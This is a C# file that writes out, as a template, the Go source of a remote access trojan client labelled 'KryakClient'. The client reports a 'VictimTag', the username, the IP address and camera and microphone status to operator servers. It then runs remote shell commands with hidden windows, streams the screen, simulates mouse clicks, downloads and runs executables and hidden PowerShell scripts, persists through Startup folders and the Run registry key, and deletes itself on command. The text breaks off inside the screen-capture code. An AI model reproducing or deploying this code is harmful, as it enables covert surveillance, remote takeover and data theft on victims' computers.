using System;

namespace KryakApp.Client
{
    internal class ClientSourceCode
    {
        public static string GetModCode()
        {
            return "module kryakclient\n\ngo 1.23\n\nrequire github.com/quic-go/quic-go v0.54.0\n";
        }

        public static string GetSumCode()
        {
            return @"github.com/quic-go/quic-go v0.54.0 h1:6s1YB9QotYI6Ospeiguknbp2Znb/jZYjZLRXn9kMQBg=
github.com/quic-go/quic-go v0.54.0/go.mod h1:e68ZEaCdyviluZmy44P6Iey98v/Wfz6HCjQEm+l8zTY=
go.uber.org/mock v0.5.0 h1:KAMbZvZPyBPWgD14IrIQ38QCyjwpvVVV6K/bHl1IwQU=
go.uber.org/mock v0.5.0/go.mod h1:ge71pBPLYDk7QIi1LupWxdAykm7KIEFchiOqd6z7qMM=
golang.org/x/crypto v0.26.0 h1:RrRspgV4mU+YwB4FYnuBoKsUapNIL5cohGAmSH3azsw=
golang.org/x/crypto v0.26.0/go.mod h1:GY7jblb9wI+FOo5y8/S2oY4zWP07AkOJ4+jxCqdqn54=
golang.org/x/mod v0.18.0 h1:5+9lSbEzPSdWkH32vYPBwEpX8KwDbM52Ud9xBUvNlb0=
golang.org/x/mod v0.18.0/go.mod h1:hTbmBsO62+eylJbnUtE2MGJUyE7QWk4xUqPFrRgJ+7c=
golang.org/x/net v0.28.0 h1:a9JDOJc5GMUJ0+UDqmLT86WiEy7iWyIhz8gz8E4e5hE=
golang.org/x/net v0.28.0/go.mod h1:yqtgsTWOOnlGLG9GFRrK3++bGOUEkNBoHZc8MEDWPNg=
golang.org/x/sync v0.8.0 h1:3NFvSEYkUoMifnESzZl15y791HH1qU2xm6eCJU5ZPXQ=
golang.org/x/sync v0.8.0/go.mod h1:Czt+wKu1gCyEFDUtn0jG5QVvpJ6rzVqr5aXyt9drQfk=
golang.org/x/sys v0.23.0 h1:YfKFowiIMvtgl1UERQoTPPToxltDeZfbj4H7dVUCwmM=
golang.org/x/sys v0.23.0/go.mod h1:/VUhepiaJMQUp4+oa/7Zr1D23ma6VTLIYjOOTFZPUcA=
golang.org/x/tools v0.22.0 h1:gqSGLZqv+AI9lIQzniJ0nZDRG5GBPsSi+DRNHWNz6yA=
golang.org/x/tools v0.22.0/go.mod h1:aCwcsjqvq7Yqt6TNyX7QMU2enbQ/Gt0bo6krSeEri+c=";
        }

        public static string GetClientCode(string[] ipList, string[] rawList, string clientTag, string securityMode, string pinnedFingerprint, int startupMode, string? dropDirectory)
        {
            string ipAddresses = string.Join(", ", Array.ConvertAll(ipList, ip => $"\"{EscapeGoString(ip)}\""));
            string raws = string.Join(", ", Array.ConvertAll(rawList, raw => $"\"{EscapeGoString(raw)}\""));
            string tag = EscapeGoString(string.IsNullOrWhiteSpace(clientTag) ? "KryakClient" : clientTag.Trim());
            string mode = EscapeGoString(string.IsNullOrWhiteSpace(securityMode) ? "insecure" : securityMode.Trim().ToLowerInvariant());
            string pinned = EscapeGoString(NormalizeFingerprint(pinnedFingerprint));
            string drop = EscapeGoString(dropDirectory ?? string.Empty);

            string src = $@"
package main

import (
    ""bufio""
    ""bytes""
    ""context""
    ""crypto/sha1""
    ""crypto/tls""
    ""crypto/x509""
    ""encoding/base64""
    ""encoding/binary""
    ""encoding/hex""
    ""encoding/json""
    ""errors""
    ""fmt""
    ""image""
    ""image/jpeg""
    ""image/png""
    ""io""
    ""net""
    ""net/http""
    ""os""
    ""os/exec""
    ""os/signal""
    ""path/filepath""
    ""strings""
    ""sync""
    ""syscall""
    ""time""
    ""unsafe""

    ""github.com/quic-go/quic-go""
)

const (
    channelMain = ""main""
    channelPing = ""ping""
    channelControl = ""control""
    channelDesktop = ""desktop""
    channelFile = ""file""

    typeHello = ""hello""
    typePingRequest = ""ping_request""
    typePong = ""pong""
    typeCommand = ""command""
    typeDesktopFrame = ""frame""
    typeDesktopStart = ""desktop_start""
    typeDesktopStop = ""desktop_stop""
    typeFileStart = ""file_start""
    typeFileChunk = ""file_chunk""
    typeFileEnd = ""file_end""
    typeFileDownload = ""file_download""
    typeRunScript = ""run_script""
    typeMouseClick = ""mouse_click""
)

const securityMode = ""{mode}""
const pinnedFingerprint = ""{pinned}""

type UserPayload struct {{
    UserIPAddress    string `json:""UserIPAddress""`
    VictimTag        string `json:""VictimTag""`
    Username         string `json:""Username""`
    Country          string `json:""Country""`
    UserOS           string `json:""UserOS""`
    AdminStatus      bool   `json:""AdminStatus""`
    CameraStatus     bool   `json:""CameraStatus""`
    MicrophoneStatus bool   `json:""MicrophoneStatus""`
    Ping             string `json:""Ping""`
    MonitorCount     int    `json:""MonitorCount""`
}}

type Message struct {{
    Channel       string       `json:""Channel""`
    Type          string       `json:""Type""`
    User          *UserPayload `json:""User,omitempty""`
    PingID        string       `json:""PingId,omitempty""`
    Command       string       `json:""Command,omitempty""`
    ConsoleOutput string       `json:""ConsoleOutput,omitempty""`
    DesktopFrame  string       `json:""DesktopFrame,omitempty""`
    DesktopMonitor int         `json:""DesktopMonitor""`
    DesktopQuality int         `json:""DesktopQuality""`
    FileData      string       `json:""FileData,omitempty""`
    FileName      string       `json:""FileName,omitempty""`
    FileSize      int64        `json:""FileSize""`
    FileUrl       string       `json:""FileUrl,omitempty""`
    RemotePath    string       `json:""RemotePath,omitempty""`
    MouseX        int          `json:""MouseX""`
    MouseY        int          `json:""MouseY""`
    MouseButton   string       `json:""MouseButton,omitempty""`
}}

type streamWriter struct {{
    mu     sync.Mutex
    stream *quic.SendStream
}}

var (
    desktopStreamingCancel     context.CancelFunc
    desktopStreamingMu         sync.Mutex
    desktopStreamingMonitorIdx int

    fileTransferMu   sync.Mutex
    fileTransferPath string
    fileTransferFile *os.File
)

func (w *streamWriter) Write(msg Message) error {{
    w.mu.Lock()
    defer w.mu.Unlock()
    return writeFrame(w.stream, msg)
}}

var (
    errCloseClient = errors.New(""close client requested"")
    errDeleteClient = errors.New(""delete client requested"")
    errRestartClient = errors.New(""restart client requested"")
)

type endpointManager struct {{
    mu      sync.Mutex
    started map[string]struct{{}}
}}

func newEndpointManager() *endpointManager {{
    return &endpointManager{{started: map[string]struct{{}}{{}}}}
}}

func (m *endpointManager) StartIfNew(ctx context.Context, endpoint string, onConnectFail func()) {{
    endpoint = strings.TrimSpace(endpoint)
    if endpoint == """" {{
        return
    }}

    m.mu.Lock()
    if _, exists := m.started[endpoint]; exists {{
        m.mu.Unlock()
        return
    }}

    m.started[endpoint] = struct{{}}{{}}
    m.mu.Unlock()

    go runEndpointLoop(ctx, endpoint, onConnectFail)
}}

func GetUserIp() string {{
	resp, err := http.Get(""https://api.ipify.org?format=text"")
	if err != nil {{
		return ""Unknown""
	}}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {{
		return ""Unknown""
	}}

	ip := """"
	_, err = fmt.Fscanf(resp.Body, ""%s"", &ip)
	if err != nil {{
		return ""Unknown""
	}}

	return ip
}}

func getAdminStatus() bool {{
	cmd := exec.Command(""net"", ""session"")
	cmd.SysProcAttr = &syscall.SysProcAttr{{HideWindow: true}}
	err := cmd.Run()
	return err == nil
}}

func getCameraStatus() bool {{
    script := ""$virtual = @('virtual','obs','ndi','manycam','droidcam','screen capture'); "" +
        ""$devices = Get-PnpDevice -Class Camera -Status OK -ErrorAction SilentlyContinue; "" +
        ""if (-not $devices) {{ $devices = Get-PnpDevice -Class Image -Status OK -ErrorAction SilentlyContinue }}; "" +
        ""if (-not $devices) {{ exit 1 }}; "" +
        ""$real = $devices | Where-Object {{ $name = ($_.FriendlyName + ' ' + $_.InstanceId).ToLower(); -not ($virtual | Where-Object {{ $name.Contains($_) }}) }}; "" +
        ""if ($real -and $real.Count -gt 0) {{ exit 0 }} else {{ exit 1 }}""

    cmd := exec.Command(""powershell"", ""-NoProfile"", ""-NonInteractive"", ""-ExecutionPolicy"", ""Bypass"", ""-Command"", script)
    cmd.SysProcAttr = &syscall.SysProcAttr{{HideWindow: true}}
    return cmd.Run() == nil
}}

func getMicrophoneStatus() bool {{
    script := ""$virtual = @('virtual','obs','ndi','manycam','voicemeeter','cable','loopback','stereo mix'); "" +
        ""$devices = Get-PnpDevice -Class AudioEndpoint -Status OK -ErrorAction SilentlyContinue; "" +
        ""if (-not $devices) {{ exit 1 }}; "" +
        ""$mics = $devices | Where-Object {{ $_.FriendlyName -match 'microphone|mic|array' -or $_.Class -eq 'AudioEndpoint' }}; "" +
        ""$real = $mics | Where-Object {{ $name = ($_.FriendlyName + ' ' + $_.InstanceId).ToLower(); -not ($virtual | Where-Object {{ $name.Contains($_) }}) }}; "" +
        ""if ($real -and $real.Count -gt 0) {{ exit 0 }} else {{ exit 1 }}""

    cmd := exec.Command(""powershell"", ""-NoProfile"", ""-NonInteractive"", ""-ExecutionPolicy"", ""Bypass"", ""-Command"", script)
    cmd.SysProcAttr = &syscall.SysProcAttr{{HideWindow: true}}
    return cmd.Run() == nil
}}

func main() {{
    ipList := []string{{{ipAddresses}}}
    rawList := []string{{{raws}}}
    startupMode := {startupMode}
    drop := ""{drop}""
    ctx, stop := signal.NotifyContext(context.Background(), os.Interrupt, syscall.SIGTERM)
    defer stop()

    manager := newEndpointManager()

    for _, endpoint := range ipList {{
        manager.StartIfNew(ctx, endpoint, nil)
    }}

    for _, rawURL := range rawList {{
        url := strings.TrimSpace(rawURL)
        if url == """" {{
            continue
        }}

        go runRawLoop(ctx, url, manager)
    }}
    switch startupMode {{
    case 1:
        moveToStartupFolder(false)
    case 2:
        moveToStartupFolder(true)
    case 3:
        addToRegistryRun()
    }}
    if drop != """" {{
        moveToDropFolder(drop)
    }}

    <-ctx.Done()
}}

func runRawLoop(ctx context.Context, rawURL string, manager *endpointManager) {{
    ticker := time.NewTicker(30 * time.Second)
    defer ticker.Stop()
    refreshCh := make(chan struct{{}}, 1)

    signalRefresh := func() {{
        select {{
        case refreshCh <- struct{{}}{{}}:
        default:
        }}
    }}

    fetch := func() {{
        endpoints, err := fetchRawEndpoints(ctx, rawURL)
        if err != nil {{
            return
        }}

        for _, endpoint := range endpoints {{
            manager.StartIfNew(ctx, endpoint, signalRefresh)
        }}
    }}

    fetch()
    for {{
        select {{
        case <-ctx.Done():
            return
        case <-refreshCh:
            fetch()
        case <-ticker.C:
            fetch()
        }}
    }}
}}

func fetchRawEndpoints(ctx context.Context, rawURL string) ([]string, error) {{
    req, err := http.NewRequestWithContext(ctx, http.MethodGet, rawURL, nil)
    if err != nil {{
        return nil, err
    }}

    resp, err := http.DefaultClient.Do(req)
    if err != nil {{
        return nil, err
    }}
    defer resp.Body.Close()

    if resp.StatusCode < 200 || resp.StatusCode >= 300 {{
        return nil, fmt.Errorf(""raw fetch status: %d"", resp.StatusCode)
    }}

    scanner := bufio.NewScanner(resp.Body)
    scanner.Buffer(make([]byte, 1024), 1024*1024)
    endpoints := make([]string, 0)
    for scanner.Scan() {{
        line := strings.TrimSpace(scanner.Text())
        if line == """" || strings.HasPrefix(line, ""#"") {{
            continue
        }}
        endpoints = append(endpoints, line)
    }}

    if err := scanner.Err(); err != nil {{
        return nil, err
    }}

    return endpoints, nil
}}

func runEndpointLoop(ctx context.Context, endpoint string, onConnectFail func()) {{
    for {{
        select {{
        case <-ctx.Done():
            return
        default:
        }}

        if err := connectAndServe(ctx, endpoint); err != nil {{
            if errors.Is(err, errCloseClient) {{
                return
            }}

            if errors.Is(err, errDeleteClient) {{
                _ = scheduleSelfDelete()
                os.Exit(0)
            }}

            if errors.Is(err, errRestartClient) {{
                _ = restartSelf()
                return
            }}

            if onConnectFail != nil {{
                onConnectFail()
            }}

            select {{
            case <-ctx.Done():
                return
            case <-time.After(3 * time.Second):
            }}
            continue
        }}

        select {{
        case <-ctx.Done():
            return
        case <-time.After(1 * time.Second):
        }}
    }}
}}

func connectAndServe(ctx context.Context, endpoint string) error {{
    host := endpointHost(endpoint)

    tlsConfig := &tls.Config{{
        NextProtos:         []string{{""kryak""}},
        MinVersion:         tls.VersionTLS13,
        ServerName:         host,
    }}

    switch securityMode {{
    case ""insecure"":
        tlsConfig.InsecureSkipVerify = true
    case ""pinned"":
        tlsConfig.InsecureSkipVerify = true
        tlsConfig.VerifyPeerCertificate = func(rawCerts [][]byte, _ [][]*x509.Certificate) error {{
            if len(rawCerts) == 0 {{
                return errors.New(""no server certificate"")
            }}

            cert, err := x509.ParseCertificate(rawCerts[0])
            if err != nil {{
                return err
            }}

            sum := sha1.Sum(cert.Raw)
            got := strings.ToUpper(hex.EncodeToString(sum[:]))
            expected := strings.ToUpper(strings.ReplaceAll(pinnedFingerprint, "":"", """"))
            if expected == """" {{
                return errors.New(""empty pinned fingerprint"")
            }}

            if got != expected {{
                return fmt.Errorf(""pinned fingerprint mismatch"")
            }}

            return nil
        }}
    default:
    }}

    conn, err := quic.DialAddr(ctx, endpoint, tlsConfig, nil)
    if err != nil {{
        return err
    }}
    defer conn.CloseWithError(0, ""disconnect"")

    mainStream, err := conn.OpenUniStreamSync(ctx)
    if err != nil {{
        return err
    }}

    writer := &streamWriter{{stream: mainStream}}
    user := UserPayload{{
        UserIPAddress:    GetUserIp(),
        VictimTag:        ""{tag}"",
        Username:         usernameOrDefault(),
        Country:          ""Unknown"",
        UserOS:           runtimeName(),
        AdminStatus:      getAdminStatus(),
        CameraStatus:     getCameraStatus(),
        MicrophoneStatus: getMicrophoneStatus(),
        Ping:             ""0"",
        MonitorCount:     getMonitorCount(),
    }}

    hello := Message{{Channel: channelMain, Type: typeHello, User: &user}}
    if err := writer.Write(hello); err != nil {{
        return err
    }}

    for {{
        stream, err := conn.AcceptUniStream(ctx)
        if err != nil {{
            return err
        }}

        if err := handleInboundStream(ctx, stream, writer); err != nil {{
            if errors.Is(err, context.Canceled) {{
                return nil
            }}
            return err
        }}
    }}
}}

func handleInboundStream(ctx context.Context, stream *quic.ReceiveStream, writer *streamWriter) error {{
    for {{
        msg, err := readFrame(stream)
        if err != nil {{
            if errors.Is(err, io.EOF) || errors.Is(err, io.ErrUnexpectedEOF) {{
                return nil
            }}
            return err
        }}

        if msg.Channel == channelPing && msg.Type == typePingRequest && msg.PingID != """" {{
            pong := Message{{Channel: channelMain, Type: typePong, PingID: msg.PingID}}
            if err := writer.Write(pong); err != nil {{
                return err
            }}
        }}

        if msg.Channel == channelMain && msg.Type == typeDesktopStart {{
            startDesktopStreaming(ctx, writer, msg.DesktopMonitor, msg.DesktopQuality)
        }}

        if msg.Channel == channelMain && msg.Type == typeDesktopStop {{
            stopDesktopStreaming()
        }}

        if msg.Channel == channelMain && msg.Type == typeMouseClick {{
            simulateMouseClick(msg.MouseX, msg.MouseY, msg.MouseButton)
        }}

        if msg.Channel == channelControl && msg.Type == typeCommand {{
            if strings.HasPrefix(msg.Command, ""remote_console:"") {{
                command := strings.TrimPrefix(msg.Command, ""remote_console:"")
                output, err := executeCommand(command)
                if err != nil {{
                    output = fmt.Sprintf(""Error: %v\n"", err)
                }}

                const maxChunkSize = 12000
                for len(output) > 0 {{
                    chunkSize := maxChunkSize
                    if len(output) < chunkSize {{
                        chunkSize = len(output)
                    }}

                    reply := Message{{
                        Channel:       channelControl,
                        Type:          ""console_output"",
                        ConsoleOutput: output[:chunkSize],
                    }}
                    output = output[chunkSize:]

                    if err := writer.Write(reply); err != nil {{
                        return err
                    }}
                }}
                continue
            }}

            switch msg.Command {{
            case ""close_client"":
                return errCloseClient
            case ""delete_client"":
                return errDeleteClient
            case ""restart_client"":
                return errRestartClient
            }}
        }}

        if msg.Channel == channelFile {{
            handleFileTransfer(msg)
        }}

        select {{
        case <-ctx.Done():
            return ctx.Err()
        default:
        }}
    }}
}}

func writeFrame(stream *quic.SendStream, msg Message) error {{
    payload, err := json.Marshal(msg)
    if err != nil {{
        return err
    }}

    frame := make([]byte, 4+len(payload))
    binary.BigEndian.PutUint32(frame[:4], uint32(len(payload)))
    copy(frame[4:], payload)

    _, err = (*stream).Write(frame)
    return err
}}

func readFrame(stream *quic.ReceiveStream) (Message, error) {{
    var sizeBuf [4]byte
    if _, err := io.ReadFull(stream, sizeBuf[:]); err != nil {{
        return Message{{}}, err
    }}

    length := binary.BigEndian.Uint32(sizeBuf[:])
    if length == 0 {{
        return Message{{}}, fmt.Errorf(""invalid frame length"")
    }}

    payload := make([]byte, length)
    if _, err := io.ReadFull(stream, payload); err != nil {{
        return Message{{}}, err
    }}

    var msg Message
    if err := json.Unmarshal(payload, &msg); err != nil {{
        return Message{{}}, err
    }}

    return msg, nil
}}

func usernameOrDefault() string {{
    if user := strings.TrimSpace(os.Getenv(""USERNAME"")); user != """" {{
        return user
    }}
    return ""client""
}}

func runtimeName() string {{
    return ""windows""
}}

func endpointHost(endpoint string) string {{
    host, _, err := net.SplitHostPort(endpoint)
    if err != nil || strings.TrimSpace(host) == """" {{
        return ""localhost""
    }}

    return host
}}

func restartSelf() error {{
    exePath, err := os.Executable()
    if err != nil {{
        return err
    }}

    cmd := exec.Command(exePath)
    cmd.SysProcAttr = &syscall.SysProcAttr{{HideWindow: true}}
    return cmd.Start()
}}

func moveToStartupFolder(allUsers bool) {{
    exePath, err := os.Executable()
    if err != nil {{
        return
    }}

    var base string
    if allUsers {{
        base = strings.TrimSpace(os.Getenv(""ProgramData""))
        if base == """" {{
            base = ""C:\\ProgramData""
        }}
        startupDir := filepath.Join(base, ""Microsoft"", ""Windows"", ""Start Menu"", ""Programs"", ""StartUp"")
        copyToStartup(exePath, startupDir)
        return
    }}

    base = strings.TrimSpace(os.Getenv(""APPDATA""))
    if base == """" {{
        return
    }}
    startupDir := filepath.Join(base, ""Microsoft"", ""Windows"", ""Start Menu"", ""Programs"", ""Startup"")
    copyToStartup(exePath, startupDir)
}}

func copyToStartup(exePath, startupDir string) {{
    targetPath := filepath.Join(startupDir, filepath.Base(exePath))

    if strings.EqualFold(exePath, targetPath) {{
        return
    }}

    data, err := os.ReadFile(exePath)
    if err != nil {{
        return
    }}

    if err := os.WriteFile(targetPath, data, 0755); err != nil {{
        return
    }}

    cmd := exec.Command(targetPath)
    cmd.SysProcAttr = &syscall.SysProcAttr{{HideWindow: true}}
    if err := cmd.Start(); err != nil {{
        return
    }}

    os.Exit(0)
}}

func addToRegistryRun() {{
    exePath, err := os.Executable()
    if err != nil {{
        return
    }}

    valueName := filepath.Base(exePath)
    if idx := strings.LastIndex(valueName, "".""); idx != -1 {{
        valueName = valueName[:idx]
    }}

    const runKey = `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`

    query := exec.Command(""reg"", ""query"", runKey, ""/v"", valueName)
    query.SysProcAttr = &syscall.SysProcAttr{{HideWindow: true}}
    if query.Run() == nil {{
        return
    }}

    addCmd := exec.Command(""reg"", ""add"", runKey, ""/v"", valueName, ""/t"", ""REG_SZ"", ""/d"", exePath, ""/f"")
    addCmd.SysProcAttr = &syscall.SysProcAttr{{HideWindow: true}}
    addCmd.Run()
}}

func moveToDropFolder(dropDir string) {{
    exePath, err := os.Executable()
    if err != nil {{
        return
    }}

    base := strings.TrimSpace(dropDir)
    if base == """" {{
        base = ""%TEMP%""
    }}
    if strings.HasPrefix(base, ""%"") && strings.HasSuffix(base, ""%"") {{
        env := strings.Trim(base, ""%"")
        if expanded := os.Getenv(env); expanded != """" {{
            base = expanded
        }}
    }}

    targetPath := filepath.Join(base, filepath.Base(exePath))
    if strings.EqualFold(exePath, targetPath) {{
        return
    }}

    data, err := os.ReadFile(exePath)
    if err != nil {{
        return
    }}

    if err := os.WriteFile(targetPath, data, 0755); err != nil {{
        return
    }}

    cmd := exec.Command(targetPath)
    cmd.SysProcAttr = &syscall.SysProcAttr{{HideWindow: true}}
    if err := cmd.Start(); err != nil {{
        return
    }}

    os.Exit(0)
}}

func scheduleSelfDelete() error {{
    exePath, err := os.Executable()
    if err != nil {{
        return err
    }}

    batPath := filepath.Join(os.TempDir(), ""selfdelete.cmd"")

    script := fmt.Sprintf(`@echo off
for /l %%%%i in (1,1,30) do (
    del /f /q ""%s"" >nul 2>&1
    if not exist ""%s"" goto done
    timeout /t 1 /nobreak >nul
)

:done
start """" /b cmd /c ""timeout /t 1 /nobreak >nul & del /f /q """"%%~f0"""" >nul 2>&1""
exit
`, exePath, exePath)

    if err := os.WriteFile(batPath, []byte(script), 0600); err != nil {{
        return err
    }}

    cmd := exec.Command(""cmd"", ""/C"", batPath)
    cmd.SysProcAttr = &syscall.SysProcAttr{{
        HideWindow: true,
        CreationFlags: 0x08000000,
    }}

    return cmd.Start()
}}

func getMonitorCount() int {{
    proc := syscall.NewLazyDLL(""user32.dll"").NewProc(""GetSystemMetrics"")
    const SM_CMONITORS = 80
    ret, _, _ := proc.Call(SM_CMONITORS)
    n := int(ret)
    if n < 1 {{
        return 1
    }}
    return n
}}

func executeCommand(command string) (string, error) {{
    cmd := exec.Command(""cmd"", ""/C"", command)
    cmd.SysProcAttr = &syscall.SysProcAttr{{HideWindow: true}}
    var stdout, stderr bytes.Buffer
    cmd.Stdout = &stdout
    cmd.Stderr = &stderr
    err := cmd.Run()

    output := stdout.String()
    if stderr.Len() > 0 {{
        if output != """" {{
            output += ""\n""
        }}
        output += stderr.String()
    }}

    if err != nil && output == """" {{
        return """", err
    }}

    return output, nil
}}

type RECT struct {{
    Left, Top, Right, Bottom int32
}}

type BITMAPINFOHEADER struct {{
    Size          uint32
    Width         int32
    Height        int32
    Planes        uint16
    BitCount      uint16
    Compression   uint32
    SizeImage     uint32
    XPelsPerMeter int32
    YPelsPerMeter int32
    ClrUsed       uint32
    ClrImportant  uint32
}}

type BITMAPINFO struct {{
    Header BITMAPINFOHEADER
    Colors [1]uint32
}}

func startDesktopStreaming(ctx context.Context, writer *streamWriter, monitorIndex, quality int) {{
    stopDesktopStreaming()

    ctx, cancel := context.WithCancel(ctx)
    desktopStreamingMu.Lock()
    desktopStreamingCancel = cancel
    desktopStreamingMonitorIdx = monitorIndex
    desktopStreamingMu.Unlock()

    go func() {{
        for {{
            select {{
            case <-ctx.Done():
                return
            default:
            }}

            frame, err := captureDesktopFrame(monitorIndex, quality)
            if err != nil {{
                continue
            }}

            msg := Message{{
                Channel:       channelDesktop,
                Type:          typeDesktopFrame,
                DesktopMonitor: monitorIndex,
                DesktopQuality: quality,
                DesktopFrame:   frame,
            }}

            if err := writer.Write(msg); err != nil {{
                return
            }}
        }}
    }}()
}}

func stopDesktopStreaming() {{
    desktopStreamingMu.Lock()
    defer desktopStreamingMu.Unlock()

    if desktopStreamingCancel != nil {{
        desktopStreamingCancel()
        desktopStreamingCancel = nil
    }}
}}

func simulateMouseClick(x, y int, button string) {{
    desktopStreamingMu.Lock()
    monitorIdx := desktopStreamingMonitorIdx
    desktopStreamingMu.Unlock()

    rect, err := getMonitorRect(monitorIdx)
    if err != nil {{
        return
    }}

    screenX := rect.Left + int32(x)
    screenY := rect.Top + int32(y)

    user32 := syscall.NewLazyDLL(""user32.dll"")
    setCursorPos := user32.NewProc(""SetCursorPos"")
    setCursorPos.Call(uintptr(screenX), uintptr(screenY))

    const (
        leftDown  = 0x0002
        leftUp    = 0x0004
        rightDown = 0x0008
        rightUp   = 0x0010
    )

    var downFlags, upFlags uintptr
    switch button {{
    case ""right"":
        downFlags = rightDown
        upFlags = rightUp
    default:
        downFlags = leftDown
        upFlags = leftUp
    }}

    mouseEvent := user32.NewProc(""mouse_event"")
    mouseEvent.Call(downFlags, 0, 0, 0, 0)
    mouseEvent.Call(upFlags, 0, 0, 0, 0)
}}

func handleFileTransfer(msg Message) {{
    fileTransferMu.Lock()
    defer fileTransferMu.Unlock()

    if msg.Type == typeFileStart {{
        if fileTransferFile != nil {{
            fileTransferFile.Close()
            fileTransferFile = nil
        }}
        fileTransferPath = resolveFilePath(msg.RemotePath, msg.FileName)
        f, err := os.Create(fileTransferPath)
        if err != nil {{
            return
        }}
        fileTransferFile = f
        return
    }}

    if msg.Type == typeFileChunk && fileTransferFile != nil {{
        data, err := base64.StdEncoding.DecodeString(msg.FileData)
        if err != nil {{
            return
        }}
        fileTransferFile.Write(data)
        return
    }}

    if msg.Type == typeFileEnd && fileTransferFile != nil {{
        fileTransferFile.Close()
        fileTransferFile = nil
        c := exec.Command(""cmd"", ""/C"", ""start"", """", fileTransferPath)
        c.SysProcAttr = &syscall.SysProcAttr{{HideWindow: true}}
        c.Start()
        fileTransferPath = """"
    }}

    if msg.Type == typeFileDownload && msg.FileUrl != """" {{
        url := msg.FileUrl
        name := msg.FileName
        if name == """" {{
            name = ""downloaded.exe""
        }}
        savePath := resolveFilePath(msg.RemotePath, name)
        go func(u, p string) {{
            resp, err := http.Get(u)
            if err != nil {{
                return
            }}
            defer resp.Body.Close()
            data, err := io.ReadAll(resp.Body)
            if err != nil {{
                return
            }}
            os.WriteFile(p, data, 0755)
            c := exec.Command(""cmd"", ""/C"", ""start"", """", p)
            c.SysProcAttr = &syscall.SysProcAttr{{HideWindow: true}}
            c.Start()
        }}(url, savePath)
    }}

    if msg.Type == typeRunScript && msg.FileData != """" && msg.FileName != """" {{
        data, err := base64.StdEncoding.DecodeString(msg.FileData)
        if err != nil {{
            return
        }}
        ext := strings.ToLower(filepath.Ext(msg.FileName))
        savePath := resolveFilePath(msg.RemotePath, msg.FileName)
        os.WriteFile(savePath, data, 0755)
        switch ext {{
        case "".vbs"":
            c := exec.Command(""cscript"", ""//NoLogo"", savePath)
            c.SysProcAttr = &syscall.SysProcAttr{{HideWindow: true}}
            c.Start()
        case "".ps1"":
            c := exec.Command(""powershell"", ""-WindowStyle"", ""Hidden"", ""-ExecutionPolicy"", ""Bypass"", ""-File"", savePath)
            c.SysProcAttr = &syscall.SysProcAttr{{HideWindow: true}}
            c.Start()
        default:
            c := exec.Command(""cmd"", ""/C"", savePath)
            c.SysProcAttr = &syscall.SysProcAttr{{HideWindow: true}}
            c.Start()
        }}
    }}
}}

func resolveFilePath(remotePath, fileName string) string {{
    base := remotePath
    if base == """" {{
        base = ""%TEMP%""
    }}
    if strings.HasPrefix(base, ""%"") && strings.HasSuffix(base, ""%"") {{
        env := strings.Trim(base, ""%"")
        expanded := os.Getenv(env)
        if expanded != """" {{
            base = expanded
        }}
    }}
    return filepath.Join(base, fileName)
}}

func getMonitorRect(index int) (*RECT, error) {{
    user32 := syscall.NewLazyDLL(""user32.dll"")
    enumDisplayMonitors := user32.NewProc(""EnumDisplayMonitors"")

    var monitors []RECT
    enumProc := syscall.NewCallback(func(hMonitor, hdcMonitor uintptr, prc *RECT, dwData uintptr) uintptr {{
        if prc != nil {{
            monitors = append(monitors, *prc)
        }}
        return 1
    }})
    ret, _, _ := enumDisplayMonitors.Call(0, 0, enumProc, 0)
    _ = ret

    if index < 0 || index >= len(monitors) {{
        return nil, fmt.Errorf(""monitor index %d out of range (have %d)"", index, len(monitors))
    }}

    return &monitors[index], nil
}}

type CURSORINFO struct {{
    CbSize      uint32
    Flags       uint32
    HCursor     uintptr
    PtScreenPos POINT
}}

type POINT struct {{
    X, Y int32
}}

func captureDesktopFrame(monitorIndex, quality int) (string, error) {{
    rect, err := getMonitorRect(monitorIndex)
    if err != nil {{
        return """", err
    }}

    width := int(rect.Right - rect.Left)
    height := int(rect.Bottom - rect.Top)
    if width <= 0 || height <= 0 {{
        return """", fmt.Errorf(""invalid monitor dimensions"")
    }}

    user32 := syscall.NewLazyDLL(""user32.dll"")
    gdi32 := syscall.NewLazyDLL(""gdi32.dll"")

    getDC := user32.NewProc(""GetDC"")
    releaseDC := user32.NewProc(""ReleaseDC"")
    createCompatibleDC := gdi32.NewProc(""CreateCompatibleDC"")
    deleteDC := gdi32.NewProc(""DeleteDC"")
    createCompatibleBitmap := gdi32.NewProc(""CreateCompatibleBitmap"")
    selectObject := gdi32.NewProc(""SelectObject"")
    deleteObject := gdi32.NewProc(""DeleteObject"")
    bitBlt := gdi32.NewProc(""BitBlt"")
    getDIBits := gdi32.NewProc(""GetDIBits"")
    getCursorInfo := user32.NewProc(""GetCursorInfo"")
    drawIconEx := user32.NewProc(""DrawIconEx"")

    ci := CURSORINFO{{CbSize: uint32(unsafe.Sizeof(CURSORINFO{{}}))}}
    getCursorInfo.Call(uintptr(unsafe.Pointer(&ci)))

    hdcScreen, _, _ := getDC.Call(0)
    if hdcScreen == 0 {{
        return """", fmt.Errorf(""GetDC failed"")
    }}
    defer releaseDC.Call(0, hdcScreen)

    hdcMem, _, _ := createCompatibleDC.Call(hdcScreen)
    if hdcMem == 0 {{
        return """", fmt.Errorf(""CreateCompatibleDC failed"")
    }}
    defer deleteDC.Call(hdcMem)

    hBitmap, _, _ := createCompatibleBitmap.Call(hdcScreen, uintptr(width), uintptr(height))
    if hBitmap == 0 {{
        return """", fmt.Errorf(""CreateCompatibleBitmap failed"")
    }}
    defer deleteObject.Call(hBitmap)

    selectObject.Call(hdcMem, hBitmap)

    const SRCCOPY = 0x00CC0020
    const CAPTUREBLT = 0x40000000
    ret, _, _ := bitBlt.Call(hdcMem, 0, 0, uintptr(width), uintptr(height),
        hdcScreen, uintptr(rect.Left), uintptr(rect.Top), SRCCOPY|CAPTUREBLT)
    if ret == 0 {{
        return """", fmt.Errorf(""BitBlt failed"")
    }}

    const CURSOR_SHOWING = 1
    if ci.Flags&CURSOR_SHOWING != 0 && ci.HCursor != 0 {{
        const DI_NORMAL = 3
        drawIconEx.Call(hdcMem,
            uintptr(ci.PtScreenPos.X-rect.Left),
            uintptr(ci.PtScreenPos.Y-rect.Top),
            ci.HCursor, 0, 0, 0, 0, DI_NORMAL)
    }}

    var bmi BITMAPINFO
    bmi.Header.Size = uint32(unsafe.Sizeof(bmi.Header))
    bmi.Header.Width = int32(width)
    bmi.Header.Height = -int32(height)
    bmi.Header.Planes = 1
    bmi.Header.BitCount = 32
    bmi.Header.Compression = 0

    stride := (width*32 + 31) / 32 * 4
    pixelData := make([]byte, stride*height)

